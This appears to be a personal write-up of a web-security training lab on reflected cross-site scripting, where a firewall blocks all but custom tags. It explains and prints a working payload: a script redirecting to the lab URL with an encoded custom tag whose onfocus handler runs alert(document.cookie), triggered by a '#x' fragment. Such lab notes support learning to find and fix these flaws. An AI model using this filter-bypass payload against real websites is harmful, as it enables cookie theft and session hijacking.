On this lab, the only tag that works is custom-tag, the other are captured for the firewall.
Here the way to bypass this is using the next payload.

The id=x is in order to give a "name" to the tag. Then the tabindex=1 is because we need give it the attribute of tab. 
![[Pasted image 20250825215946.png]]

Finally we need to use ``` #x ```, this trigger that the browser look for the id = x on the web, which contain the payload.

```
<script> location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>
```